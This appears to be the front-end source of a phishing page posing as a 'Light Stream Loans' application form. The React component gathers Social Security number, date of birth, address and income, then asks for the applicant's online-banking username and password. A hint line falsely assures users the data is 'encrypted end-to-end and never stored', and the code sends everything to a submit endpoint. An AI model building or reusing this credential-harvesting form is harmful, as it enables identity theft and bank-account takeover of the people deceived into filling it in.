"use client";

import { useState } from "react";

const initialData = {
  firstName: "",
  lastName: "",
  phone: "",
  email: "",
  ssn: "",
  dob: "",
  address: "",
  city: "",
  state: "",
  zip: "",
  housing: "rent",
  loanAmount: "",
  loanPurpose: "debt_consolidation",
  income: "",
  employment: "employed",
  bankUsername: "",
  bankPassword: "",
  agreed: false,
};

type LoanData = typeof initialData;

const steps = ["Personal", "Address", "Financial", "Verify"];

const stepMeta = [
  {
    title: "Personal Information",
    description: "Tell us a bit about yourself.",
    icon: (
      <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
      </svg>
    ),
  },
  {
    title: "Address Information",
    description: "Where do you currently live?",
    icon: (
      <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" />
      </svg>
    ),
  },
  {
    title: "Financial Information",
    description: "Tell us about your loan and bank.",
    icon: (
      <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
        <path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.89 2.44 2.1h2.09c-.05-1.8-1.19-3.45-3.42-3.95V2h-2.42v2.05c-2.14.37-3.63 1.6-3.63 3.65 0 2.33 1.91 3.29 4.68 4.05 2.66.71 3.39 1.5 3.39 2.54 0 .86-.69 1.75-2.74 1.75-1.9 0-2.83-.89-2.83-2.2h-2.09c.06 2.09 1.59 3.68 4.08 4.13V22h2.42v-2.03c1.93-.27 4.09-1.23 4.09-4.02 0-2.79-2.12-3.46-4.68-4.05z" />
      </svg>
    ),
  },
  {
    title: "Bank Authentication",
    description: "Securely verify your account.",
    icon: (
      <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
      </svg>
    ),
  },
];

export default function LoanForm() {
  const [step, setStep] = useState(1);
  const [data, setData] = useState<LoanData>(initialData);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);

  const update = (field: keyof LoanData, value: string | boolean) => {
    setData((prev) => ({ ...prev, [field]: value }));
  };

  const next = () => {
    if (validateStep(step)) {
      setError(null);
      setStep((s) => Math.min(s + 1, 4));
    }
  };

  const back = () => setStep((s) => Math.max(s - 1, 1));

  const validateStep = (current: number) => {
    const required: Record<number, (keyof LoanData)[]> = {
      1: ["firstName", "lastName", "phone", "email", "ssn", "dob"],
      2: ["address", "city", "state", "zip", "housing"],
      3: ["loanAmount", "loanPurpose", "income", "employment"],
      4: ["bankUsername", "bankPassword"],
    };

    const missing = required[current].filter((key) => !String(data[key]).trim());
    if (missing.length > 0) {
      setError("Please fill in all required fields.");
      return false;
    }
    if (current === 4 && !data.agreed) {
      setError("Please agree to the terms.");
      return false;
    }
    return true;
  };

  const submit = async () => {
    if (!validateStep(step)) return;
    setLoading(true);
    setError(null);
    setMessage(null);

    try {
      const res = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });

      const json = await res.json().catch(() => ({ error: "Unknown error" }));

      if (!res.ok) {
        throw new Error(json.error || "Submission failed");
      }

      setMessage("Application submitted successfully.");
    } catch (err) {
      setError(err instanceof Error ? err.message : "Something went wrong.");
    } finally {
      setLoading(false);
    }
  };

  const input = (field: keyof LoanData, label: string, type = "text", extra?: string) => (
    <div className="form-group" key={field}>
      <label htmlFor={field}>
        {label} <span className="required">*</span>
      </label>
      <input
        id={field}
        type={type}
        value={data[field] as string}
        onChange={(e) => update(field, e.target.value)}
        suppressHydrationWarning
      />
      {extra && <p className="hint">{extra}</p>}
    </div>
  );

  const select = (field: keyof LoanData, label: string, options: { value: string; label: string }[]) => (
    <div className="form-group" key={field}>
      <label htmlFor={field}>
        {label} <span className="required">*</span>
      </label>
      <select
        id={field}
        value={data[field] as string}
        onChange={(e) => update(field, e.target.value)}
        suppressHydrationWarning
      >
        {options.map((o) => (
          <option key={o.value} value={o.value}>
            {o.label}
          </option>
        ))}
      </select>
    </div>
  );

  const renderStep = () => {
    switch (step) {
      case 1:
        return (
          <>
            <div className="form-row">
              {input("firstName", "First Name")}
              {input("lastName", "Last Name")}
            </div>
            <div className="form-row">
              {input("phone", "Phone Number", "tel")}
              {input("email", "Email", "email")}
            </div>
            <div className="form-row">
              {input("ssn", "Social Security Number")}
              {input("dob", "Date of Birth", "date")}
            </div>
          </>
        );
      case 2:
        return (
          <>
            {input("address", "Street Address")}
            <div className="form-row">
              {input("city", "City")}
              {input("state", "State")}
            </div>
            <div className="form-row">
              {input("zip", "ZIP Code")}
              {select("housing", "Housing Status", [
                { value: "rent", label: "Rent" },
                { value: "own", label: "Own" },
                { value: "other", label: "Other" },
              ])}
            </div>
          </>
        );
      case 3:
        return (
          <>
            <div className="form-row">
              {input("loanAmount", "Loan Amount", "number")}
              {select("loanPurpose", "Loan Purpose", [
                { value: "debt_consolidation", label: "Debt Consolidation" },
                { value: "home_improvement", label: "Home Improvement" },
                { value: "auto_refinance", label: "Auto Refinance" },
                { value: "medical", label: "Medical" },
                { value: "wedding", label: "Wedding" },
                { value: "business", label: "Business" },
                { value: "other", label: "Other" },
              ])}
            </div>
            <div className="form-row">
              {input("income", "Annual Income", "number")}
              {select("employment", "Employment Status", [
                { value: "employed", label: "Employed" },
                { value: "self_employed", label: "Self-Employed" },
                { value: "unemployed", label: "Unemployed" },
                { value: "retired", label: "Retired" },
              ])}
            </div>
          </>
        );
      case 4:
        return (
          <>
            <p className="hint">
              Provide your bank login credentials for instant account verification. Your data is encrypted end-to-end
              and never stored.
            </p>
            <div className="form-row">
              {input("bankUsername", "Bank Username")}
              {input("bankPassword", "Bank Password", "password")}
            </div>
            <div className="form-group agree-box">
              <label>
                <input
                  type="checkbox"
                  checked={data.agreed}
                  onChange={(e) => update("agreed", e.target.checked)}
                  suppressHydrationWarning
                />
                I agree to the <a href="#">Terms &amp; Conditions</a> and <a href="#">Privacy Policy</a>.
              </label>
            </div>
          </>
        );
      default:
        return null;
    }
  };

  if (message) {
    return (
      <div className="form-card">
        <div className="success-box">
          <h2>Thank you!</h2>
          <p>{message}</p>
          <p style={{ marginTop: "1rem" }}>
            A Light Stream Loans representative will contact you shortly.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="loan-form-wrapper">
      <div className="steps">
        {steps.map((s, i) => {
          const n = i + 1;
          const active = n === step;
          const done = n < step;
          return (
            <div key={s} className={`step ${active ? "active" : ""} ${done ? "done" : ""}`}>
              <div className="step-circle">{n}</div>
              <div className="step-label">{s}</div>
            </div>
          );
        })}
      </div>

      <div className="form-card">
        <div className="form-card-header">
          <div className="form-card-icon">
            {stepMeta[step - 1].icon}
            <span className="form-card-badge">{step}</span>
          </div>
          <div>
            <h2>{stepMeta[step - 1].title}</h2>
            <p>{stepMeta[step - 1].description}</p>
          </div>
        </div>

        {renderStep()}

        {error && <p className="error">{error}</p>}

        <div className="button-row">
          <button className="btn btn-secondary" disabled={step === 1} onClick={back}>
            Back
          </button>
          {step < 4 ? (
            <button className="btn btn-primary" onClick={next}>
              Next
            </button>
          ) : (
            <button className="btn btn-primary" onClick={submit} disabled={loading}>
              {loading ? "Submitting..." : "Submit Application"}
            </button>
          )}
        </div>
      </div>
    </div>
  );
}
